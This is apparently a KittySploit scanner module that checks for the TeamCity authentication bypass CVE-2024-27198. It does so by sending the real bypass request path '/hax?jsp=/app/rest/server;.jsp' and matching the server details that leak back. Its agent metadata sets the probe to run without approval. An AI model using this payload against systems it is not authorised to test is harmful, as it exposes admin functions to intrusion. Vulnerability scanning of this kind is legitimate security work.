#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""In JetBrains TeamCity before 2023."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'TeamCity < 2023.11.4 - Authentication Bypass Detection',
        'description': 'In JetBrains TeamCity before 2023.11.4 authentication bypass allowing to perform admin actions was possible',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'teamcity', 'jetbrains', 'auth-bypass', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-27198',
            'https://www.darkreading.com/cyberattacks-data-breaches/jetbrains-teamcity-mass-exploitation-underway-rogue-accounts-thrive',
            'https://github.com/rampantspark/CVE-2024-27198',
            'https://github.com/fireinrain/github-trending',
        ],
        'cve': 'CVE-2024-27198',
    }

    def run(self):
        r = self.http_request(method="GET", path='/hax?jsp=/app/rest/server;.jsp', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        server = r.headers.get("Server") or r.headers.get("server") or ""
        body_any = ('Authentication required', 'login.html',)
        body_all = ('buildNumber', 'server version', 'internalId',)
        header_any = ('application/xml', 'text/xml',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='critical',
                reason="TeamCity < 2023.11.4 - Authentication Bypass detected",
                path='/hax?jsp=/app/rest/server;.jsp',
            )
            return True
        return False

